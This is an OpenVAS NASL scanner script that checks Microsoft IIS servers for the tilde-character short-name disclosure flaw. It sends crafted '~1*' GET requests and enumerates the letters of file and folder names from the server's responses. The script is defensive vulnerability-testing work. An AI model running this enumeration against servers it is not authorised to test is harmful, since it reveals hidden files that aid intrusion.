# SPDX-FileCopyrightText: 2012 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:microsoft:internet_information_services";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.802887");
  script_version("2023-10-10T05:05:41+0000");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_tag(name:"last_modification", value:"2023-10-10 05:05:41 +0000 (Tue, 10 Oct 2023)");
  script_tag(name:"creation_date", value:"2012-07-18 10:29:25 +0530 (Wed, 18 Jul 2012)");
  script_name("Microsoft IIS Tilde Character Information Disclosure Vulnerability (HTTP)");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2012 Greenbone AG");
  script_family("Web Servers");
  script_dependencies("gb_microsoft_iis_http_detect.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("IIS/installed");

  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/19525");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/54251");
  script_xref(name:"URL", value:"http://code.google.com/p/iis-shortname-scanner-poc");
  script_xref(name:"URL", value:"http://soroush.secproject.com/downloadable/iis_tilde_shortname_disclosure.txt");
  script_xref(name:"URL", value:"http://soroush.secproject.com/downloadable/microsoft_iis_tilde_character_vulnerability_feature.pdf");

  script_tag(name:"summary", value:"The Microsoft IIS Webserver is prone to an information
  disclosure vulnerability.");

  script_tag(name:"vuldetect", value:"Sends various crafted HTTP GET requests and checks the
  responses.");

  script_tag(name:"insight", value:"Microsoft IIS fails to validate a specially crafted GET request
  containing a '~' tilde character, which allows to disclose all short-names of folders and files
  having 4 letters extensions.");

  script_tag(name:"impact", value:"Successful exploitation will allow remote attackers to obtain
  sensitive information that could aid in further attacks.");

  script_tag(name:"affected", value:"All versions of the Microsoft IIS Webserver.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year
  since the disclosure of this vulnerability. Likely none will be provided anymore. General
  solution options are to upgrade to a newer release, disable respective features, remove the
  product or replace the product by another one.");

  script_tag(name:"qod_type", value:"remote_vul");
  script_tag(name:"solution_type", value:"WillNotFix");

  exit(0);
}

include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");

if(!port = get_app_port(cpe:CPE, service:"www"))
  exit(0);

if(!vers = get_app_version(cpe:CPE, port:port))
  exit(0);

# nb: List of all possible letters a folder/file name may have
possible_letters = make_list(
  "0", "1", "2", "3", "4", "5", "6", "7", "8", "9", "a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l",
  "m", "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z");

# nb: List of all possible files
files = make_list("a.aspx", "a.shtml", "a.asp", "a.asmx", "a.ashx", "a.config", "a.php", "a.jpg", "a.xxx", "");

# nb: To make openvas-nasl-lint happy...
count = 0;
valid_letter = "";
found_urls = "";
invalid_file_folder = "1234567890";

foreach file(files) {
  url1 = "/%2F*~1*%2F" + file + "?aspxerrorpath=/";

  req1 = http_get(item:url1, port:port);
  res1 = http_keepalive_send_recv(port:port, data:req1, bodyonly:FALSE);

  if(!res1 || (vers !~ "^7\." && res1 !~ "^HTTP/1\.[01] 404") ||
     (vers =~ "^7\." && res1 !~ "Error Code</th><td>0x00000000")) {
    continue;
  }

  url2 = "/%2F" + invalid_file_folder + "*1~*%2F" + file + "?aspxerrorpath=/";

  req2 = http_get(item:url2, port:port);
  res2 = http_keepalive_send_recv(port:port, data:req2, bodyonly:FALSE);

  if(res2 && (vers !~ "^7\." && res2 =~ "^HTTP/1\.[01] 400") ||
     (vers =~ "^7\." && res2 =~ "Error Code</th><td>0x80070002")) {

    # nb: Now iterate over all possible letters to find the file or folders names
    while(count < 4) {
      foreach letter (possible_letters) {
        url3 = "/%2F" + valid_letter + letter + "*~1*%2F" + file + "?aspxerrorpath=/";

        req3 = http_get(item:url3, port:port);
        res3 = http_keepalive_send_recv(port:port, data:req3, bodyonly:FALSE);

        # nb: If its 404 then its a valid letter and there is file/folder starting with that letter
        if(!res3 || (vers !~ "^7\." && res3 !~ "^HTTP/1\.[01] 404") ||
           (vers =~ "^7\." && res3 !~ "Error Code</th><td>0x00000000")) {
          continue;
        }

        found_urls   += '\n   ' + http_report_vuln_url(port:port, url:url3, url_only:TRUE);
        valid_letter += letter;
      }
      count++;

    }
    if(strlen(valid_letter) > 0) {
      msg  = "File/Folder name found on server starting with:";
      msg += '\n\n' + valid_letter;
      msg += '\n\nenumerated based on the following HTTP responses:';
      msg += '\n\n - Received a "HTTP 400 (Bad Request)" status code or a "0x80070002" error code when accessing the invalid File/Folder "' + invalid_file_folder + '" via the URL:\n   ' + http_report_vuln_url(port:port, url:url2, url_only:TRUE);
      msg += '\n\n - Received a "HTTP 404 (Not Found)" status code or a  "0x00000000" error code when accessing a valid File/Folder with the following subsequent enumeration requests:' + found_urls;
      security_message(port:port, data:msg);
      exit(0);
    }
  }
}

exit(99);
